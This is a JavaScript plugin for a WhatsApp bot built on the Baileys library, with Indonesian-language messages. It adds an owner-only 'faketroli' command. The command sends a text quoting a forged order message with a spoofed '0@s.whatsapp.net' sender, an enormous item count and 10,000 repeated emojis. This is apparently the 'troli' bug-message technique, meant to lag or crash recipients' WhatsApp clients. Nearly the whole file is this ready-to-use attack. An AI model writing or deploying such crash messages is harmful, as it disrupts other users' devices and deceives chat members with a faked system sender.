const { MessageType } = require("@adiwajshing/baileys")
let axios = require("axios");
let fs = require("fs");
let handler = async(m, { conn, args, text, usedPrefix: _p }) => {
//if(args.length == 0) return m.reply(`Cara Penggunaan: Reply Foto, Ketik *${_p}faketroli* <TextMessage> | <OrderMessage> | <OrderTitle>\nContoh: *${_p}faketroli* Hai Wibu | SGDC-BOT | 10k Bang?`) 
	let [sayang, F] = text.split("|")
	if(!sayang) return m.reply("Masukkan Teks Utama")
	//if(!kecil) return m.reply("Masukkan Teks Title Order!")
  try{
//let q = m.quoted ? m.quoted : m
//let mime = (q.msg || q).mimetype || ''
   // if (!/image\/(jpe?g|png)/.test(mime)) return m.reply("Foto Aja Om :)")
    //let img = await q.download()
        let img = "./src/crop_image.jpg"
	const xixi = {
	                  key : {
                      participant : '0@s.whatsapp.net'
                    },
                    message: {
                    orderMessage: {
                            itemCount : 99999999999999999999999999999999999999999999999999999999,
                            status: 1,
                            surface : 1,
                            message: '🔥'.repeat(10000),
                            orderTitle: "JayaBotz",
                            thumbnail: fs.readFileSync("./src/crop_image.jpg"),
                            sellerJid: '0@s.whatsapp.net'
                        }
                }
          }
          conn.sendMessage(m.chat, sayang, MessageType.extendedText, { quoted: xixi })
      }catch (e){
      	m.reply("*EMROR*")
      console.log(e)
      }
}

handler.command = /^(faketroli)$/i
handler.rowner = true
module.exports = handler
